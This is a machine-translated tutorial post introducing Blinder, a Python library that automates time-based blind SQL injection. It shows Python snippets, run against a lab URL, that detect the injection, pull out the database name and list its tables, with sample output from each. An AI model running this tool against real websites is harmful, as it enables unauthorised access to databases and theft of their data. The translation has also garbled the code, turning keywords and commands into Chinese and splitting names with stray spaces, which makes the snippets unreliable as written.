# Blinder:自动化基于时间的盲目 SQL 注入的 Python 库

> 原文：<https://kalilinuxtutorials.com/blinder/>

[![Blinder : A Python Library To Automate Time-Based Blind SQL Injection](img/3465dde885162e288056a18dc648364d.png "Blinder : A Python Library To Automate Time-Based Blind SQL Injection")](https://1.bp.blogspot.com/-O3fwJacA_5I/Xjn-thhP_xI/AAAAAAAAEsQ/y5ELY-83xis44yT9UITzqMVfL4UMGmC1QCLcBGAsYHQ/s1600/Sql.png)

**Blinder** 是一个小的 python 库，通过使用预定义的查询作为自动化快速 PoC 开发的函数来自动化基于时间的盲 SQL 注入。

**安装**

您可以使用以下命令安装它:

**pip 安装遮挡板**

或者下载源代码并手动导入到您的项目中。

**用法**

要使用它，你需要导入`Blinder`模块，然后开始使用它的主要功能。

**也可以理解为-[应用程序检查器:一个源代码分析器，用于显示感兴趣的特性](https://kalilinuxtutorials.com/application-inspector/)**

您可以在“当前版本”中使用它来执行以下操作:

*   检查基于时间的注射。
*   获取数据库名称。
*   获取表名。

**您可以使用以下代码在 URL 中检查注入:**

**！/usr/bin/python**
**导入 Blinder
blind = Blinder . Blinder(
" http://sqli-lab/SQL _ injection/index . PHP？search=3 "，
sleep = 1
)
print blind . check _ injection()**

执行结果将是:

**root @ kali:~/Desktop # python check . py
True
root @ kali:~/Desktop #**

您可以使用以下代码获取数据库名称:

**！/usr/bin/python

导入 Blinder
blind = Blinder . Blinder(
" http://sqli-lab/SQL _ injection/index . PHP？search=3 "，
sleep=1
)

print "数据库名称为:%s " % blind.get_database()**

结果将会是:

**root @ kali:~/Desktop # python get-Database . py
数据库名称为:db1
root@kali:~/Desktop#**

要获取表名，可以使用以下代码:

**！/usr/bin/python**
**导入 Blinder
blind = Blinder . Blinder(
" http://sqli-lab/SQL _ injection/index . PHP？search=3 "，
sleep = 1
)

tables = blind . get _ tables()**

对于表中的表:

**打印表格**

结果将会是:

**root @ kali:~/Desktop # python get-tables . py
博客
笔记
root@kali:~/Desktop#**

[**Download**](https://github.com/mhaskar/Blinder)